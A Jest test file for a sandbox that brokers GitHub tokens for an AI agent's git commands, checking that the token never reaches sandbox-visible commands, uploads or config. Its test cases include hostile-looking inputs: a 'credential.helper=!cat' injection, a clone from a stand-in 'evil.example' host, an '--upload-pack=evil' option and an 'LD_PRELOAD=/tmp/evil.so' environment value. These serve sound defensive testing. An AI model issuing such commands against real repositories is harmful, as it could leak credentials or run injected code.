import type { ApprovalDecision } from '../../../src/core/events/schema';
import { isCallToolResponseResult } from '../../../src/core/mcp/IMCPServer';
import { GITHUB_GIT_FORM_UNAUTHENTICATED_HINT } from '../../../src/core/sandbox/githubConnectorHint';
import type { ExecResult, SandboxExecParams, SandboxProvider } from '../../../src/core/sandbox/provider/Provider';
import { SANDBOX_EXEC_TOOL_NAME, Sandbox, type BoundRepository } from '../../../src/core/sandbox/Sandbox';
import { NOOP_AGENT_TRACING } from '../../../src/core/tracing/NoopAgentTracing';
import { makeSilentLogger } from '../harnessMocks';
import { TestDurableWorkspaceCoordinator } from './durableWorkspaceCoordinator';

// Assembled at runtime so secret scanners do not mistake the synthetic value for a real token.
const TOKEN = ['ghp', 'SyntheticTokenForTestsOnly0123456789'].join('_');
const TOKEN_SPELLINGS = [
  TOKEN,
  Buffer.from(TOKEN).toString('base64'),
  Buffer.from(`x-access-token:${TOKEN}`).toString('base64'),
  encodeURIComponent(TOKEN),
];
const TOKEN_ENV_KEY = 'TRUEFORGE_GIT_TOKEN';
const SAFE_LOCAL_CONFIG = 'core.repositoryformatversion\nremote.origin.url\nremote.origin.fetch\nbranch.main.remote\n';

interface Recorder {
  execs: SandboxExecParams[];
  uploads: Buffer[];
}

function containsToken(value: unknown): boolean {
  const serialized = JSON.stringify(value);
  return TOKEN_SPELLINGS.some(spelling => serialized.includes(spelling));
}

function isProbe(params: SandboxExecParams): boolean {
  return params.command.includes("'config' '--local'");
}

function isBrokered(params: SandboxExecParams): boolean {
  return params.env?.[TOKEN_ENV_KEY] !== undefined;
}

function makeProvider(input: { recorder: Recorder; localConfig?: string }): SandboxProvider {
  const exec = (params: SandboxExecParams): Promise<ExecResult> => {
    input.recorder.execs.push(params);
    const result = isProbe(params)
      ? (input.localConfig ?? SAFE_LOCAL_CONFIG)
      : params.command === BOUND_REPOSITORY_STATE_COMMAND
        ? '/work/repo\nmain\n0123456789abcdef\n'
        : params.command === 'git rev-parse --show-toplevel'
          ? '/work/repo'
          : params.command === 'git rev-parse --absolute-git-dir'
            ? '/work/repo/.git'
            : params.command.startsWith('ls -di -- .git ')
              ? '11 .git\n12 /work/repo/.git'
              : '';
    return Promise.resolve({ success: true, response: { exitCode: 0, result } });
  };
  return {
    type: 'local',
    buildImage: () => Promise.resolve({ status: 'ready', reason: null, metadata: null }),
    getImageBuildStatus: () => Promise.resolve({ status: 'ready', reason: null, metadata: null }),
    acknowledgeWorkspaceTermination: () => Promise.resolve(),
    executeVerifiedWorkspaceCommit: () =>
      Promise.resolve({ status: 'indeterminate', result: { success: false, error: 'not used by this fixture' } }),
    getAdditionalInstructions: () => undefined,
    getWorkspaceDir: () => undefined,
    getToolResultDumpDir: sandboxId => `${sandboxId}/tool-results`,
    getGitCredentialsPath: sandboxId => `${sandboxId}/.git-credentials`,
    getFileUploadsDir: sandboxId => `${sandboxId}/uploads`,
    getSkillsDir: sandboxId => `${sandboxId}/skills`,
    getSkillDownloaderPath: sandboxId => `${sandboxId}/git_downloader.py`,
    downloadFile: jest.fn(),
    uploadFile: params => {
      input.recorder.uploads.push(params.content);
      return Promise.resolve(undefined);
    },
    createCodeModeTransport: jest.fn(),
    createSandbox: () => Promise.resolve({ sandboxId: '/tmp/host-auth-git' }),
    exec,
  };
}

const BOUND_REPOSITORY: BoundRepository = {
  repository_id: 'repo-1',
  revision: 1,
  workspace_cwd: '/work/repo',
  commands: [],
};
const BOUND_REPOSITORY_STATE_COMMAND =
  'git rev-parse --show-toplevel && git rev-parse --abbrev-ref HEAD && git rev-parse HEAD';

function makeSandbox(input: { provider: SandboxProvider; token: string | null; bound?: boolean }): Sandbox {
  return new Sandbox({
    ...(input.bound === true
      ? {
          boundRepository: BOUND_REPOSITORY,
          loadBoundRepository: () => Promise.resolve(BOUND_REPOSITORY),
          workspaceVerificationCoordinator: new TestDurableWorkspaceCoordinator(),
          workspaceLeaseOwnerId: 'test-replica',
        }
      : {}),
    provider: input.provider,
    blockDestructiveToolsInCodeMode: true,
    mcpRequestTimeoutMs: 60_000,
    mcpConnectTimeoutMs: 5_000,
    logger: makeSilentLogger(),
    tracing: NOOP_AGENT_TRACING,
    githubConnectorAttached: input.token !== null,
    githubGitToken: input.token,
  });
}

async function run(input: {
  sandbox: Sandbox;
  command: string;
  purpose?: 'inspect' | 'edit' | 'push';
  env?: Record<string, string>;
  cwd?: string;
}): Promise<{ isError: boolean; text: string }> {
  const approval: ApprovalDecision = { status: 'allow', scope: 'once' };
  const result = await input.sandbox.callTool(
    {
      name: SANDBOX_EXEC_TOOL_NAME,
      arguments: {
        intent: 'git work',
        purpose: input.purpose ?? 'edit',
        command: input.command,
        cwd: input.cwd ?? '/work/repo',
        ...(input.env === undefined ? {} : { env: input.env }),
      },
    },
    approval,
  );
  if (!isCallToolResponseResult(result)) {
    throw new Error('expected a tool result');
  }
  const content = result.result.content[0];
  return { isError: result.result.isError === true, text: content?.type === 'text' ? content.text : '' };
}

describe('host-authenticated git keeps the token out of the sandbox', () => {
  test('a bound repository never sees the token across bind, refresh and push', async () => {
    const recorder: Recorder = { execs: [], uploads: [] };
    const sandbox = makeSandbox({ provider: makeProvider({ recorder }), token: TOKEN, bound: true });
    await sandbox.refreshBoundRepositoryState();
    await run({ sandbox, command: 'git push origin main', purpose: 'push' });
    await run({ sandbox, command: 'cat .git/config', purpose: 'inspect' });
    await run({ sandbox, command: 'git remote -v', purpose: 'inspect' });

    const brokered = recorder.execs.filter(isBrokered);
    expect(brokered).toHaveLength(1);
    expect(containsToken(recorder.execs.filter(params => !isBrokered(params)))).toBe(false);
    for (const params of brokered) {
      expect(containsToken(params.command)).toBe(false);
    }
    expect(containsToken(recorder.uploads.map(upload => upload.toString('utf8')))).toBe(false);
    expect(recorder.execs.some(params => params.command === BOUND_REPOSITORY_STATE_COMMAND)).toBe(true);
  });

  test('initialisation scrubs the legacy credential file and writes nothing secret', async () => {
    const recorder: Recorder = { execs: [], uploads: [] };
    const sandbox = makeSandbox({ provider: makeProvider({ recorder }), token: TOKEN });
    await run({ sandbox, command: 'ls', purpose: 'inspect' });
    expect(recorder.execs.some(params => params.command === "rm -f '/tmp/host-auth-git/.git-credentials'")).toBe(true);
    expect(containsToken(recorder.execs)).toBe(false);
    expect(containsToken(recorder.uploads.map(upload => upload.toString('utf8')))).toBe(false);
  });

  test('clone, fetch, pull and push carry the token only in the env of the host-built git process', async () => {
    const recorder: Recorder = { execs: [], uploads: [] };
    const sandbox = makeSandbox({ provider: makeProvider({ recorder }), token: TOKEN });
    await run({ sandbox, command: 'git clone --depth 1 https://github.com/acme/widgets widgets' });
    await run({ sandbox, command: 'git fetch origin' });
    await run({ sandbox, command: 'git pull --ff-only' });
    await run({ sandbox, command: 'git push -u origin feature/x', purpose: 'push' });
    await run({ sandbox, command: 'cat .git/config', purpose: 'inspect' });
    await run({ sandbox, command: 'git remote -v', purpose: 'inspect' });
    await run({ sandbox, command: 'env', purpose: 'inspect' });

    const brokered = recorder.execs.filter(isBrokered);
    expect(brokered).toHaveLength(4);
    for (const params of brokered) {
      expect(params.command.startsWith("'/usr/bin/git'")).toBe(true);
      expect(containsToken(params.command)).toBe(false);
      expect(Object.entries(params.env ?? {}).filter(([, value]) => value.includes(TOKEN))).toEqual([
        [TOKEN_ENV_KEY, TOKEN],
      ]);
    }
    const others = recorder.execs.filter(params => !isBrokered(params));
    expect(others.length).toBeGreaterThan(4);
    for (const params of others) {
      expect(containsToken(params)).toBe(false);
      expect(Object.values(params.env ?? {}).some(value => value.startsWith('credential'))).toBe(false);
    }
    expect(containsToken(recorder.uploads.map(upload => upload.toString('utf8')))).toBe(false);
  });

  test('the config probe that gates fetch, pull and push is token-free', async () => {
    const recorder: Recorder = { execs: [], uploads: [] };
    const sandbox = makeSandbox({ provider: makeProvider({ recorder }), token: TOKEN });
    await run({ sandbox, command: 'git push origin main', purpose: 'push' });
    const probes = recorder.execs.filter(isProbe);
    expect(probes).toHaveLength(1);
    expect(containsToken(probes)).toBe(false);
  });

  test('a repository config that can run programs gets no token and no git process', async () => {
    const recorder: Recorder = { execs: [], uploads: [] };
    const provider = makeProvider({ recorder, localConfig: 'core.repositoryformatversion\ncore.fsmonitor\n' });
    const sandbox = makeSandbox({ provider, token: TOKEN });
    const result = await run({ sandbox, command: 'git push origin main', purpose: 'push' });
    expect(result.isError).toBe(true);
    expect(result.text).toContain('did not authenticate');
    expect(recorder.execs.filter(params => params.command.includes("'push'"))).toHaveLength(0);
    expect(containsToken(recorder.execs)).toBe(false);
  });

  test.each([
    ['global option', 'git -c credential.helper=!cat push origin main'],
    ['non-github host', 'git clone https://evil.example/acme/widgets'],
    ['chained command', 'git fetch origin && cat .git/config'],
    ['upload-pack', 'git fetch --upload-pack=evil origin'],
  ])('%s runs without any token', async (_name, command) => {
    const recorder: Recorder = { execs: [], uploads: [] };
    const sandbox = makeSandbox({ provider: makeProvider({ recorder }), token: TOKEN });
    await run({ sandbox, command });
    expect(containsToken(recorder.execs)).toBe(false);
    expect(recorder.execs.some(params => params.command.includes(command))).toBe(true);
  });

  test('model-supplied env disqualifies host authentication', async () => {
    const recorder: Recorder = { execs: [], uploads: [] };
    const sandbox = makeSandbox({ provider: makeProvider({ recorder }), token: TOKEN });
    await run({ sandbox, command: 'git fetch origin', env: { LD_PRELOAD: '/tmp/evil.so' } });
    expect(containsToken(recorder.execs)).toBe(false);
  });

  test('without a connector token nothing is injected and the command is untouched', async () => {
    const recorder: Recorder = { execs: [], uploads: [] };
    const sandbox = makeSandbox({ provider: makeProvider({ recorder }), token: null });
    await run({ sandbox, command: 'git fetch origin' });
    expect(recorder.execs.some(params => params.command === 'git fetch origin')).toBe(true);
    expect(recorder.execs.some(isBrokered)).toBe(false);
  });

  test('a failed unsupported form tells the model why it ran unauthenticated', async () => {
    const recorder: Recorder = { execs: [], uploads: [] };
    const base = makeProvider({ recorder });
    const provider: SandboxProvider = {
      ...base,
      exec: params =>
        params.command.includes('git -c')
          ? Promise.resolve({
              success: true,
              response: { exitCode: 128, result: "fatal: could not read Username for 'https://github.com'" },
            })
          : base.exec(params),
    };
    const sandbox = makeSandbox({ provider, token: TOKEN });
    const result = await run({ sandbox, command: 'git -c a=b clone https://github.com/acme/widgets' });
    expect(result.text).toContain(GITHUB_GIT_FORM_UNAUTHENTICATED_HINT);
  });
});
